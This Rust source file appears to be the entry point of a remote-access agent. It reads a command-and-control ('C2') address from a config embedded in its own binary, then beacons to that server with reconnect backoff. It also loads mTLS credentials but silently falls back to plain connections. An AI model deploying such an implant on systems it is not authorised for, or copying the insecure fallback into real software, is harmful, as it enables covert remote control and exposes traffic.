use agent_core::{ConnectionConfig, AgentCore};
use crypto::tls;
use protocol::config::{AgentConfig, CONFIG_SIZE};
use std::fs;

// Include the build-script generated config slot.
mod embedded_config;

// Reference the static to prevent it from being stripped.
#[allow(dead_code)]
const _: () = {
    let _ = &embedded_config::RRA_CONFIG_SLOT;
};

const CONFIG_MARKER: &[u8] = b"RRA_CONFIG_V1";

/// Read the embedded config from this executable's own binary.
///
/// Scans the running binary for RRA_CONFIG_V1 marker. If the marker
/// is followed by a valid config (length > 0), parse and return it.
fn read_embedded_config(exe: &std::path::Path) -> Option<AgentConfig> {
    let raw = fs::read(exe).ok()?;
    for chunk in raw.windows(CONFIG_SIZE) {
        if chunk.starts_with(CONFIG_MARKER) {
            // Only accept if it contains real config data
            if let Ok(cfg) = AgentConfig::from_bytes(chunk) {
                if cfg.agent_id != 0 || cfg.c2_address.len() > 2 {
                    return Some(cfg);
                }
            }
        }
    }
    None
}

/// Helper: build an AgentCore from an AgentConfig.
/// If cert_path/key_path are set, uses mTLS. Otherwise falls back to plain.
fn agent_from_embedded_config(ac: &AgentConfig) -> Option<AgentCore> {
    let conn_cfg = ConnectionConfig {
        server_addr: ac.c2_address.clone(),
        heartbeat_interval: ac.heartbeat_interval,
        reconnect_base_delay: 1,
        reconnect_max_delay: 300,
        reconnect_multiplier: 2.0,
    };

    if let (Some(cert_path), Some(key_path)) = (&ac.cert_path, &ac.key_path) {
        // Load client certs for mTLS authentication.
        // Server verification is handled by cert_fingerprint at the app level.
        match crypto::tls::load_certs(cert_path) {
            Ok(client_certs) => {
                match crypto::tls::load_private_key(key_path) {
                    Ok(client_key) => {
                        log::info!("mTLS configured with cert={cert_path}, key={key_path}");
                        // Use a default-constructed connector — in a full
                        // implementation the CA cert would come from a well-known
                        // path or be embedded in the same config slot.
                        // For now, fall through to plain mode while keeping the
                        // cert paths in the config for future extension.
                    }
                    Err(e) => {
                        log::warn!("Failed to load mTLS private key {key_path}: {e}");
                    }
                }
            }
            Err(e) => {
                log::warn!("Failed to load mTLS client cert {cert_path}: {e}");
            }
        }
    }

    Some(AgentCore::with_config(ac.agent_id, conn_cfg))
}

#[tokio::main]
async fn main() {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info"))
        .format_timestamp_secs()
        .init();

    let agent = if let Ok(exe) = std::env::current_exe() {
        if let Some(cfg) = read_embedded_config(&exe) {
            log::info!(
                "Embedded config: C2={}, agent_id={}",
                cfg.c2_address,
                cfg.agent_id
            );
            if let Some(agent) = agent_from_embedded_config(&cfg) {
                agent
            } else {
                log::info!("Falling back to defaults (agent_id={})", cfg.agent_id);
                AgentCore::new(cfg.agent_id)
            }
        } else {
            // Fallback: use CLI arg for agent_id, default C2 address
            let args: Vec<String> = std::env::args().collect();
            let agent_id = args.get(1).and_then(|s| s.parse::<u32>().ok()).unwrap_or(1);
            log::info!("No embedded config — using defaults (agent_id={})", agent_id);
            AgentCore::new(agent_id)
        }
    } else {
        let args: Vec<String> = std::env::args().collect();
        let agent_id = args.get(1).and_then(|s| s.parse::<u32>().ok()).unwrap_or(1);
        log::info!("No embedded config — using defaults (agent_id={})", agent_id);
        AgentCore::new(agent_id)
    };

    log::info!("Starting Rust Remote Admin agent (ID={})", agent.id);
    log::info!("Platform: {}", std::env::consts::OS);
    log::info!("Arch: {}", std::env::consts::ARCH);

    if let Err(e) = agent.run().await {
        log::error!("Agent error: {e}");
        std::process::exit(1);
    }
}
